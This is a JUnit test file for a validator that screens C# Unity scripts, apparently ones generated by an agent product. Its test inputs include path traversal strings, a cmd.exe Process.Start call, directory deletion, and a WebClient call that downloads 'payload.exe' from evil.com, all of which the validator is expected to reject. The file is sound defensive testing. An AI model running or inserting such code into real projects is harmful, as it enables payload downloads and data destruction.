package com.unityagent.product;

import com.unityagent.agent.security.ScriptSafetyValidator;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

public class ScriptSafetyHardeningTest {

    private ScriptSafetyValidator validator;

    @BeforeEach
    void setUp() {
        validator = new ScriptSafetyValidator();
    }

    @Test
    void testValidUnityMonoBehaviourPasses() {
        String validCode = """
                using UnityEngine;

                public class PlayerController : MonoBehaviour {
                    public float speed = 5.0f;
                    void Update() {
                        transform.Translate(Vector3.forward * speed * Time.deltaTime);
                    }
                    void OnTriggerEnter(Collider other) {
                        if (other.CompareTag("Coin")) {
                            Destroy(other.gameObject);
                        }
                    }
                }
                """;

        ScriptSafetyValidator.ValidationResult result = validator.validate("Assets/Scripts/PlayerController.cs", validCode);
        assertTrue(result.isValid());
        assertEquals("Assets/Scripts/PlayerController.cs", result.getNormalizedPath());
        assertNull(result.getViolationMessage());
    }

    @Test
    void testPathTraversalRejection() {
        String code = "public class SafeClass : MonoBehaviour {}";

        assertFalse(validator.validatePath("../System32/evil.cs").isValid());
        assertFalse(validator.validatePath("Assets/../../Secret.cs").isValid());
        assertFalse(validator.validatePath("C:/Windows/System32/bad.cs").isValid());
        assertFalse(validator.validatePath("/etc/shadow.cs").isValid());
        assertFalse(validator.validatePath("Assets/Scripts/Player.txt").isValid()); // Not .cs
    }

    @Test
    void testProcessStartAndCommandExecutionRejection() {
        String processCode = """
                using System.Diagnostics;
                public class Runner {
                    void Run() {
                        Process.Start("cmd.exe", "/c dir");
                    }
                }
                """;
        ScriptSafetyValidator.ValidationResult result = validator.validateContent(processCode);
        assertFalse(result.isValid());
        assertTrue(result.getViolationMessage().contains("prohibited API"));
    }

    @Test
    void testDestructiveFileIORejection() {
        String deleteCode = """
                using System.IO;
                public class Cleaner {
                    void Clean() {
                        File.Delete("somefile.txt");
                        Directory.Delete("Assets");
                    }
                }
                """;
        ScriptSafetyValidator.ValidationResult result = validator.validateContent(deleteCode);
        assertFalse(result.isValid());
        assertTrue(result.getViolationMessage().contains("prohibited API"));
    }

    @Test
    void testRawNetworkingRejection() {
        String netCode = """
                using System.Net;
                public class Downloader {
                    void Download() {
                        WebClient client = new WebClient();
                        client.DownloadFile("http://evil.com/payload.exe", "payload.exe");
                    }
                }
                """;
        ScriptSafetyValidator.ValidationResult result = validator.validateContent(netCode);
        assertFalse(result.isValid());
        assertTrue(result.getViolationMessage().contains("prohibited API"));
    }

    @Test
    void testReflectionAbuseRejection() {
        String reflectionCode = """
                using System;
                public class Reflective {
                    void Exec() {
                        Type t = Type.GetType("System.IO.File");
                        Activator.CreateInstance(t);
                    }
                }
                """;
        ScriptSafetyValidator.ValidationResult result = validator.validateContent(reflectionCode);
        assertFalse(result.isValid());
        assertTrue(result.getViolationMessage().contains("prohibited API"));
    }

    @Test
    void testUnsafeMemoryRejection() {
        String unsafeCode = """
                public class MemoryHacker {
                    unsafe {
                        int x = 10;
                        int* ptr = &x;
                    }
                }
                """;
        ScriptSafetyValidator.ValidationResult result = validator.validateContent(unsafeCode);
        assertFalse(result.isValid());
        assertTrue(result.getViolationMessage().contains("prohibited API"));
    }
}
